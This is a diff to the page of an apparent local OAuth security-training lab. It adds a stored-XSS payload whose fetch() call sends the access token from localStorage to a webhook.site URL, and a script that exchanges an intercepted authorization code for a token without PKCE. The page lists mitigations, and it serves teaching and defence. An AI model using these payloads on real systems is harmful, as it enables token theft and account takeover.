@@ -198,23 +198,40 @@
 
         <!-- Scenario 1 -->
         <div class="scenario">
-            <h2>🔴 Attack 1: Steal Access Token from localStorage</h2>
-            <p>The vulnerable client stores access tokens in browser localStorage, making them accessible to any JavaScript code, including XSS attacks.</p>
+            <h2>🔴 Attack 1: XSS Attack - Steal Access Token via Unsanitized Input</h2>
+            <p>The vulnerable client has a message board that doesn't sanitize user input, allowing XSS attacks to steal access tokens from localStorage.</p>
             
             <div class="attack-step">
-                <strong>Step 1:</strong> First, complete OAuth login on the vulnerable client
+                <strong>Step 1:</strong> Login to the vulnerable client
                 <br>
-                <button onclick="window.open('http://localhost:3000', '_blank')">Open Vulnerable Client</button>
+                <button onclick="window.open('http://localhost:3000', '_blank')">Open Vulnerable Client & Login</button>
+                <p style="margin-top: 10px; color: #ffa500;">Login with: <code>demo / password123</code></p>
             </div>
             
             <div class="attack-step">
-                <strong>Step 2:</strong> After logging in, open browser console on <code>localhost:3000</code> and run:
+                <strong>Step 2:</strong> Set up webhook to capture stolen token
                 <br>
+                <p style="margin-top: 10px;">1. Go to <a href="https://webhook.site" target="_blank" style="color: #4ec9b0;">https://webhook.site</a> and copy your unique URL</p>
+                <p style="margin-top: 5px;">2. Replace YOUR_WEBHOOK_URL in the payload below with your webhook URL</p>
+            </div>
+            
+            <div class="attack-step">
+                <strong>Step 3:</strong> Inject XSS payload into the message board
+                <br>
+                <p style="margin-top: 10px;">Copy this XSS payload (update webhook URL first):</p>
                 <div class="code-block">
-                    <pre>console.log(' STOLEN TOKEN:', localStorage.getItem('access_token'));</pre>
+                    <pre id="xss-payload1">&lt;img src=x onerror="fetch('https://webhook.site/YOUR_WEBHOOK_URL?token='+localStorage.getItem('access_token'))"&gt;</pre>
                 </div>
-                <button onclick="copyXSSCode()">Copy XSS Attack Code</button>
-                <button onclick="openVulnerableApp()">Open Vulnerable App + Instructions</button>
+                <button onclick="copyText('xss-payload1')">Copy Payload (Webhook Exfiltration)</button>
+                <br><br>
+                <p style="margin-top: 10px;">For testing without webhook (shows alert):</p>
+                <div class="code-block">
+                    <pre id="xss-payload2">&lt;img src=x onerror="alert(localStorage.getItem('access_token'))"&gt;</pre>
+                </div>
+                <button onclick="copyText('xss-payload2')">Copy Payload (Alert Demo)</button>
+                <br><br>
+                <p style="color: #0e8a0e;">✓ Paste the payload into the message board on the vulnerable client</p>
+                <p style="color: #0e8a0e;">✓ Click "Post Message" and check your webhook.site for the stolen token!</p>
             </div>
             
             <div id="token-output" class="output" style="display:none;"></div>
@@ -222,36 +239,57 @@
             <div class="vulnerability">
                 <strong>Why this works:</strong>
                 <ul style="margin-left: 20px; margin-top: 10px;">
-                    <li>Access token stored in localStorage (not HttpOnly cookie)</li>
-                    <li>Any JavaScript can access localStorage</li>
-                    <li>XSS vulnerabilities can exploit this</li>
-                    <li>Malicious browser extensions can steal tokens</li>
-                    <li>Tokens persist across browser sessions</li>
+                    <li><strong>No Input Sanitization:</strong> User input directly inserted into DOM using innerHTML</li>
+                    <li><strong>localStorage Exposed:</strong> Access tokens stored in localStorage (accessible to any JavaScript)</li>
+                    <li><strong>No CSP:</strong> No Content Security Policy to block inline scripts</li>
+                    <li><strong>XSS Execution:</strong> Malicious JavaScript runs with full page privileges</li>
+                    <li><strong>Token Theft:</strong> Attacker can read localStorage and exfiltrate tokens</li>
+                </ul>
+                
+                <strong style="display: block; margin-top: 15px; color: #0e8a0e;">Mitigation:</strong>
+                <ul style="margin-left: 20px; margin-top: 5px; color: #0e8a0e;">
+                    <li>Sanitize all user input (use textContent instead of innerHTML)</li>
+                    <li>Store tokens in HttpOnly cookies (not accessible to JavaScript)</li>
+                    <li>Implement Content Security Policy (CSP)</li>
+                    <li>Use DOMPurify or similar libraries for HTML sanitization</li>
                 </ul>
             </div>
         </div>
 
-        <!-- Scenario 2 -->
+        <!-- Scenario 2 + 5 Combined -->
         <div class="scenario">
-            <h2>🔴 Attack 2: Extract Authorization Code from URL</h2>
-            <p>After OAuth authorization, the authorization code is visible in the browser URL, making it easy to intercept.</p>
+            <h2>🔴 Attack 2: Authorization Code Interception & Exploitation (No PKCE)</h2>
+            <p>This demonstrates the complete attack chain: intercepting the authorization code from the URL, then exchanging it for an access token without PKCE protection.</p>
             
             <div class="attack-step">
-                <strong>Simulation:</strong> Check if callback URL contains authorization code
+                <strong>Step 1:</strong> Intercept Authorization Code
                 <br>
-                <button onclick="checkCallbackUrl()">Check Current URL for Codes</button>
+                1. Click button to login at vulnerable client<br>
+                2. After OAuth login, authorization code appears in URL<br>
+                3. Copy the code from: <code>http://localhost:3000/callback?code=XXXXX</code>
+                <br><br>
+                <button onclick="window.open('http://localhost:3000', '_blank')">Start OAuth Flow (Open Vulnerable Client)</button>
             </div>
             
-            <div id="url-output" class="output" style="display:none;"></div>
+            <div class="attack-step">
+                <strong>Step 2:</strong> Exchange Intercepted Code for Access Token (Attacker)
+                <br>
+                <input type="text" id="intercepted-code" placeholder="Paste authorization code here (from callback URL)" 
+                       style="width: 100%; padding: 8px; background: #1e1e1e; color: #d4d4d4; border: 1px solid #444; border-radius: 4px; margin: 10px 0;">
+                <br>
+                <button onclick="stealTokenWithCode()">Exchange Code for Token (No PKCE!)</button>
+            </div>
+            
+            <div id="pkce-output" class="output" style="display:none;"></div>
             
             <div class="vulnerability">
-                <strong>Exposure points:</strong>
+                <strong>Why this attack works:</strong>
                 <ul style="margin-left: 20px; margin-top: 10px;">
-                    <li>Visible in browser address bar</li>
-                    <li>Stored in browser history</li>
-                    <li>Logged on servers (Referer header)</li>
-                    <li>Visible in screenshots/recordings</li>
-                    <li>Accessible to browser extensions</li>
+                    <li><strong>Code Exposure:</strong> Authorization code visible in browser URL, history, logs</li>
+                    <li><strong>No PKCE:</strong> Server doesn't require code_verifier for token exchange</li>
+                    <li><strong>No Binding:</strong> Anyone with the code can exchange it</li>
+                    <li><strong>Attack Vectors:</strong> Network sniffing, malware, browser history, shoulder surfing</li>
+                    <li><strong>Result:</strong> Attacker gets full access token and compromises user account</li>
                 </ul>
             </div>
         </div>
@@ -307,25 +345,7 @@
             </div>
         </div>
 
-        <!-- Scenario 5 -->
-        <div class="scenario">
-            <h2>🔴 Attack 5: Use Stolen Token to Access User Data</h2>
-            <p>Once we have an access token, we can access protected resources.</p>
-            
-            <div class="attack-step">
-                <strong>Use Stolen Token:</strong>
-                <br>
-                <input type="text" id="stolen-token" placeholder="Paste stolen access token here" 
-                       style="width: 100%; padding: 8px; background: #1e1e1e; color: #d4d4d4; border: 1px solid #444; border-radius: 4px;">
-                <br><br>
-                <button onclick="useStolenToken()">Access User Data with Token</button>
-                <button onclick="document.getElementById('stolen-token').value = localStorage.getItem('access_token') || 'No token in localStorage'">Get Token from localStorage</button>
-            </div>
-            
-            <div id="stolen-data-output" class="output" style="display:none;"></div>
-        </div>
-
-        <!-- Comparison -->
+        <!-- Scenario 3 -->
         <div class="scenario">
             <h2>📊 Vulnerability vs Secure Comparison</h2>
             
@@ -381,44 +401,48 @@
             output.innerHTML = '';
         }
 
-        function copyXSSCode() {
-            const xssCode = `console.log('STOLEN TOKEN:', localStorage.getItem('access_token'));`;
+        function copyText(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.textContent;
             
-            navigator.clipboard.writeText(xssCode).then(() => {
+            navigator.clipboard.writeText(text).then(() => {
                 clearLog('token-output');
-                log('token-output', '✓ XSS attack code copied to clipboard!', 'success');
+                log('token-output', '✓ XSS payload copied to clipboard!', 'success');
                 log('token-output', '');
-                log('token-output', 'Instructions:', 'info');
-                log('token-output', '1. Open http://localhost:3000 in a new tab', 'info');
-                log('token-output', '2. Complete the OAuth login', 'info');
-                log('token-output', '3. Open browser DevTools Console (F12)', 'info');
-                log('token-output', '4. Paste and run the code', 'info');
-                log('token-output', '5. See the stolen token in console!', 'info');
+                log('token-output', 'Next steps:', 'info');
+                log('token-output', '1. Go to the vulnerable client (http://localhost:3000)', 'info');
+                log('token-output', '2. Login if not already logged in', 'info');
+                log('token-output', '3. Find the "Message Board" section', 'info');
+                log('token-output', '4. Paste the payload into the message input', 'info');
+                log('token-output', '5. Click "Post Message"', 'info');
+                log('token-output', '6. Watch the XSS execute and steal the token!', 'success');
                 log('token-output', '');
-                log('token-output', '🚨 Why this works:', 'warning');
-                log('token-output', '   - Tokens stored in localStorage (not secure)', 'warning');
-                log('token-output', '   - Any JavaScript can access localStorage', 'warning');
-                log('token-output', '   - XSS attacks can steal tokens', 'warning');
-                log('token-output', '   - Malicious extensions can steal tokens', 'warning');
+                log('token-output', '🚨 This demonstrates real XSS vulnerability!', 'error');
+                
+                document.getElementById('token-output').style.display = 'block';
+            }).catch(err => {
+                alert('Failed to copy: ' + err);
             });
         }
         
         function openVulnerableApp() {
             clearLog('token-output');
-            log('token-output', '📋 Attack Instructions:', 'info');
+            log('token-output', '📋 XSS Attack Instructions:', 'info');
             log('token-output', '');
-            log('token-output', 'Step 1: Complete OAuth login', 'info');
-            log('token-output', '  Opening vulnerable app in new tab...', 'info');
+            log('token-output', 'Step 1: Complete OAuth login in the opened tab', 'info');
+            log('token-output', '  (Use: demo / password123)', 'info');
             log('token-output', '');
-            log('token-output', 'Step 2: After login, press F12 to open DevTools', 'warning');
+            log('token-output', 'Step 2: Scroll down to "Message Board" section', 'warning');
             log('token-output', '');
-            log('token-output', 'Step 3: In Console tab, paste this code:', 'warning');
-            log('token-output', '  localStorage.getItem("access_token")', 'error');
+            log('token-output', 'Step 3: Copy an XSS payload (click buttons above)', 'warning');
             log('token-output', '');
-            log('token-output', 'Step 4: See stolen token displayed!', 'error');
+            log('token-output', 'Step 4: Paste payload in message box and post', 'error');
             log('token-output', '');
-            log('token-output', '🚨 This demonstrates XSS token theft', 'error');
+            log('token-output', 'Step 5: Watch XSS steal the access token!', 'error');
+            log('token-output', '');
+            log('token-output', '🚨 Real XSS - No console needed!', 'error');
             
+            document.getElementById('token-output').style.display = 'block';
             window.open('http://localhost:3000', '_blank');
         }
 
@@ -548,6 +572,122 @@
             } catch (error) {
                 log('stolen-data-output', `✗ Error: ${error.message}`, 'error');
                 log('stolen-data-output', 'Failed to connect to server', 'error');
+            }
+        }
+
+        function startNoPKCEDemo() {
+            clearLog('pkce-output');
+            log('pkce-output', '🔍 Starting OAuth flow to demonstrate No PKCE vulnerability...', 'info');
+            log('pkce-output', '');
+            log('pkce-output', 'Opening vulnerable client...', 'info');
+            log('pkce-output', 'After login, return here and click "Check for Code in URL"', 'warning');
+            
+            window.open('http://localhost:3000', '_blank');
+        }
+
+        function checkForCode() {
+            clearLog('pkce-output');
+            log('pkce-output', '🔍 Checking for authorization code...', 'info');
+            log('pkce-output', '');
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            
+            if (code) {
+                log('pkce-output', '✓ Authorization code found in URL!', 'success');
+                log('pkce-output', `Code: ${code}`, 'info');
+                log('pkce-output', '');
+                log('pkce-output', '✗ This code is NOT protected by PKCE!', 'error');
+                log('pkce-output', '✗ Anyone can use this code to get a token', 'error');
+                log('pkce-output', '');
+                log('pkce-output', 'Click "Auto-fill Code" then "Exchange Code for Token"', 'warning');
+                
+                document.getElementById('intercepted-code').value = code;
+            } else {
+                log('pkce-output', 'ℹ No code found in current URL', 'info');
+                log('pkce-output', 'Instructions:', 'info');
+                log('pkce-output', '1. Click "Start OAuth Flow"', 'info');
+                log('pkce-output', '2. Login on the vulnerable app', 'info');
+                log('pkce-output', '3. After redirect, come back to THIS tab', 'info');
+                log('pkce-output', '4. OR copy the callback URL and open it in this tab', 'info');
+            }
+        }
+
+        function autoFillCode() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            
+            if (code) {
+                document.getElementById('intercepted-code').value = code;
+                clearLog('pkce-output');
+                log('pkce-output', '✓ Code auto-filled from URL!', 'success');
+                log('pkce-output', `Code: ${code}`, 'info');
+                log('pkce-output', '');
+                log('pkce-output', 'Now click "Exchange Code for Token"', 'warning');
+            } else {
+                clearLog('pkce-output');
+                log('pkce-output', '❌ No code in URL', 'error');
+                log('pkce-output', 'Complete OAuth login first or paste code manually', 'info');
+            }
+        }
+
+        async function stealTokenWithCode() {
+            clearLog('pkce-output');
+            const code = document.getElementById('intercepted-code').value.trim();
+            
+            if (!code) {
+                log('pkce-output', '❌ Please enter an authorization code', 'error');
+                return;
+            }
+            
+            log('pkce-output', '🎭 ATTACKER: Intercepted authorization code!', 'warning');
+            log('pkce-output', `Code: ${code}`, 'info');
+            log('pkce-output', '');
+            log('pkce-output', 'Exchanging code for access token...', 'warning');
+            log('pkce-output', '');
+            
+            try {
+                const response = await fetch('http://localhost:4000/token', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `grant_type=authorization_code&code=${encodeURIComponent(code)}&redirect_uri=http://localhost:3000/callback&client_id=client-app-vulnerable`
+                });
+                
+                if (response.ok) {
+                    const tokenData = await response.json();
+                    log('pkce-output', '✓ ATTACK SUCCESSFUL!', 'success');
+                    log('pkce-output', '✓ Token exchange completed WITHOUT PKCE verification!', 'success');
+                    log('pkce-output', '');
+                    log('pkce-output', 'Stolen Token Response:', 'success');
+                    log('pkce-output', JSON.stringify(tokenData, null, 2), 'success');
+                    log('pkce-output', '');
+                    log('pkce-output', '🚨 Why this worked:', 'error');
+                    log('pkce-output', '   ✗ No code_challenge sent in authorization request', 'error');
+                    log('pkce-output', '   ✗ No code_verifier required in token exchange', 'error');
+                    log('pkce-output', '   ✗ Server accepted code without PKCE validation', 'error');
+                    log('pkce-output', '   ✗ Attacker now has full access token!', 'error');
+                    log('pkce-output', '');
+                    log('pkce-output', '💡 With PKCE enabled:', 'info');
+                    log('pkce-output', '   - Original client creates code_verifier secret', 'info');
+                    log('pkce-output', '   - Sends SHA256(code_verifier) to server', 'info');
+                    log('pkce-output', '   - Token exchange requires original code_verifier', 'info');
+                    log('pkce-output', '   - Interceptor cannot provide correct verifier', 'info');
+                    log('pkce-output', '   - Attack would FAIL ✓', 'info');
+                } else {
+                    const errorText = await response.text();
+                    log('pkce-output', `✗ Token exchange failed: ${response.status}`, 'error');
+                    log('pkce-output', errorText, 'error');
+                    log('pkce-output', '');
+                    log('pkce-output', 'Possible reasons:', 'info');
+                    log('pkce-output', '   - Code already used or expired', 'info');
+                    log('pkce-output', '   - Get a fresh code by logging in again', 'info');
+                }
+            } catch (error) {
+                log('pkce-output', `✗ Error: ${error.message}`, 'error');
+                log('pkce-output', '');
+                log('pkce-output', 'Make sure auth server is running on port 4000', 'error');
             }
         }
 
